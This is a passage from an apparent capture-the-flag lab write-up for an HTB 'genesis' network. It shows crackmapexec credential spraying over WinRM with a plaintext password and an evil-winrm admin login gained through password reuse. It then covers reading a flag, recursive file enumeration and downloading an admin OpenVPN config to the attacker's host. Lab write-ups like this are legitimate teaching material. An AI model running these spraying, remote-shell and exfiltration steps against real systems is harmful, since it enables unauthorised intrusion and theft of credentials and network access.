Lets see about finding what the user is

## Crackmapexec
Lets run it against winrm, ssh, ftp, smb and etc

```
crackmapexec winrm 10.10.110.0/24 -u rbiscuit -p pRdJh3RpL2

```
```
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\rbiscuit:pRdJh3RpL2 "Bad HTTP response returned from the server. Code: 415, Content: ''"
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [+] SRV01-Artemis\rbiscuit:pRdJh3RpL2 (Pwn3d!)
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\rbiscuit:pRdJh3RpL2
```

I logged in and saw that rbiscuit had an admin account so lets see if there is a shared password

```
evil-winrm -u rbiscuit_adm -p pRdJh3RpL2 -i 10.10.110.5

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\rbiscuit_adm\Documents> cd ..
*Evil-WinRM* PS C:\Users\rbiscuit_adm> cd desktop
*Evil-WinRM* PS C:\Users\rbiscuit_adm\desktop> dir
```

    Directory: C:\Users\rbiscuit_adm\desktop

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2021   2:35 PM                IT Support


*Evil-WinRM* PS C:\Users\rbiscuit_adm\desktop> cd ..
*Evil-WinRM* PS C:\Users\rbiscuit_adm> cd ..
*Evil-WinRM* PS C:\Users> cd administrator
*Evil-WinRM* PS C:\Users\administrator> cd desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> dir


    Directory: C:\Users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/10/2020   1:27 PM             19 flag.txt


*Evil-WinRM* PS C:\Users\administrator\desktop> cat flag.txt
GENESIS{OMG_YYY???}
*Evil-WinRM* PS C:\Users\administrator\desktop> 
```
## Further Enumeration
```
*Evil-WinRM* PS C:\Users\rbiscuit_adm> get-childitem -recurse
```
```
  Directory: C:\Users\rbiscuit_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2021   2:35 PM                IT Support


    Directory: C:\Users\rbiscuit_adm\Desktop\IT Support


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2021   2:36 PM                Networking


    Directory: C:\Users\rbiscuit_adm\Desktop\IT Support\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2021   2:36 PM                AdminNetwork


    Directory: C:\Users\rbiscuit_adm\Desktop\IT Support\Networking\AdminNetwork


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/24/2021   7:43 AM           5118 admin-network.ovpn


    Directory: C:\Users\rbiscuit_adm\Favorites


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/18/2022   2:02 PM                Links
-a----        7/18/2022   2:02 PM            208 Bing.url


    Directory: C:\Users\rbiscuit_adm\Links


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/18/2022   2:02 PM            556 Desktop.lnk
-a----        7/18/2022   2:02 PM           1009 Downloads.lnk


    Directory: C:\Users\rbiscuit_adm\OpenVPN

```
Lets Download the ovenvpn
```
*Evil-WinRM* PS C:\> download "C:\Users\rbiscuit_adm\Desktop\IT Support\Networking\AdminNetwork\admin-network.ovpn" /home/p3ta/HTB/genesis/admin.ovpn
Info: Downloading C:\Users\rbiscuit_adm\Desktop\IT Support\Networking\AdminNetwork\admin-network.ovpn to /home/p3ta/HTB/genesis/admin.ovpn

                                                             
Info: Download successful!
```


